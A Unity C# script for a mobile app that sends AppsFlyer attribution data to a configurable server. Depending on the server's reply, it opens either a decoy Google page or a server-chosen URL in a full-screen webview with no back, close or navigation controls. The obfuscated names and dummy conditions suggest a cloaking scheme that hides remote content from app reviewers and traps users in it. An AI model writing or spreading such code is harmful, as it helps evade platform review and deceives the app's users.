using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using OneSignalSDK;
using System.Net.Http;
using Newtonsoft.Json;
using System.Threading.Tasks;
using Gpm.WebView;

public class WebViewShow : MonoBehaviour
{
    [SerializeField] private AppsFlyerObjectScript appsFlyer;
    [SerializeField] private SampleWebViewStudio webViewAccWonder;
    [SerializeField] private string packageNameAccWonder;
    [SerializeField] private string oneSignalIDAccWonder;
    [SerializeField] private string playerWebAccWonder;

    private bool isReady = true;
    private int indexOfCounting = 2;
    private string resultOfQuestion = "";
    private string searchingValue = "https://google.com.ua";

    private void Start()
    {
        Init();
    }

    private void Init()
    {
        OneSignal.Initialize(oneSignalIDAccWonder);
        appsFlyer.SetOnReady(GotIt);
        appsFlyer.AddValueToDictionary(packageNameAccWonder, oneSignalIDAccWonder);
    }

    public void GotIt()
    {
        GetResponce();
    }

    public void ShowUrlFullScreen(string url)
    {
        GpmWebView.ShowUrl(
            url,
            GetConfiguration(),
            OnCallback,
            new List<string>() { "USER_ CUSTOM_SCHEME" });
    }

    public void Show(string value)
    {
#if UNITY_IOS
        ShowUrlFullScreen(value);
#elif UNITY_ANDROID
        webViewAccWonder.Url = value;
        StartCoroutine(webViewAccWonder.InitForWebGod());
#endif
    }

    private async void GetResponce()
    {
        if (false == false)
        {
            resultOfQuestion = await CheckResponce(playerWebAccWonder, JsonConvert.SerializeObject(appsFlyer.DataAccWonder));
            Debug.Log($"result = {resultOfQuestion}");
            ReturnValue();
            Show(searchingValue);
        }
    }

    private void ReturnValue()
    {
        if (isReady)
        {
            var text = GetAnswer(resultOfQuestion, true).Replace(" ", "");
            var isGood = text == "true";

            if (isGood)
            {
                searchingValue = GetAnswer(resultOfQuestion);
            }
        }
    }

    private async Task<string> CheckResponce(string apiUrlDataInfoLimbix, string jsonUserDataLimbix)
    {
        using (HttpClient clientDataServ = new HttpClient())
        {
            StringContent contentDataInfo = new StringContent(jsonUserDataLimbix, System.Text.Encoding.UTF8, "application/json");
            HttpResponseMessage responseDataInfo = await clientDataServ.PostAsync(apiUrlDataInfoLimbix, contentDataInfo);

            if (responseDataInfo.IsSuccessStatusCode)
            {
                return await responseDataInfo.Content.ReadAsStringAsync();
            }
            else
            {
                var gg = indexOfCounting;
                return null;
            }
        }
    }

    private string GetAnswer(string value, bool need = false)
    {
        if (true == true && value != "")
        {
            var answer = JsonUtility.FromJson<Responce>(value);

            if (need)
            {
                return answer.status;
            }
            return answer.answer;
        }
        else
            return "https://google.com.ua";
    }

    private void OnCallback
    (
        GpmWebViewCallback.CallbackType callbackType,
        string data,
        GpmWebViewError error)
    {
        Debug.Log("OnCallback: " + callbackType);
        switch (callbackType)
        {
            case GpmWebViewCallback.CallbackType.Open:
                if (error != null)
                {
                    Debug.LogFormat("Fail to open WebView. Error:{0}", error);
                }

                break;
            case GpmWebViewCallback.CallbackType.Close:
                if (error != null)
                {
                    Debug.LogFormat("Fail to close WebView. Error:{0}", error);
                }

                break;
            case GpmWebViewCallback.CallbackType.PageStarted:
                if (string.IsNullOrEmpty(data) == false)
                {
                    Debug.LogFormat("PageStarted Url : {0}", data);
                }

                break;
            case GpmWebViewCallback.CallbackType.PageLoad:
                if (string.IsNullOrEmpty(data) == false)
                {
                    Debug.LogFormat("Loaded Page:{0}", data);
                }

                break;
            case GpmWebViewCallback.CallbackType.MultiWindowOpen:
                Debug.Log("MultiWindowOpen");
                break;
            case GpmWebViewCallback.CallbackType.MultiWindowClose:
                Debug.Log("MultiWindowClose");
                break;
            case GpmWebViewCallback.CallbackType.Scheme:
                if (error == null)
                {
                    if (data.Equals("USER_ CUSTOM_SCHEME") == true || data.Contains("CUSTOM_SCHEME") == true)
                    {
                        Debug.Log(string.Format("scheme:{0}", data));
                    }
                }
                else
                {
                    Debug.Log(string.Format("Fail to custom scheme. Error:{0}", error));
                }

                break;
            case GpmWebViewCallback.CallbackType.GoBack:
                Debug.Log("GoBack");
                break;
            case GpmWebViewCallback.CallbackType.GoForward:
                Debug.Log("GoForward");
                break;
            case GpmWebViewCallback.CallbackType.ExecuteJavascript:
                Debug.LogFormat("ExecuteJavascript data : {0}, error : {1}", data, error);
                break;
#if UNITY_ANDROID
            case GpmWebViewCallback.CallbackType.BackButtonClose:
                Debug.Log("BackButtonClose");
                break;
#endif
        }
    }

    public GpmWebViewRequest.Configuration GetConfiguration()
    {
        return new GpmWebViewRequest.Configuration
            ()
        {
            style = GpmWebViewStyle.FULLSCREEN,
            orientation = GpmOrientation.UNSPECIFIED,
            isClearCookie = true,
            isClearCache = true,
            backgroundColor = "#FFFFFF",
            isNavigationBarVisible = false,
            isBackButtonVisible = false,
            isForwardButtonVisible = false,
            isCloseButtonVisible = false,
            supportMultipleWindows = false,
#if UNITY_IOS
             contentMode = GpmWebViewContentMode.MOBILE
#endif
        };
    }
}

struct Responce
{
    public string status;
    public string answer;
}

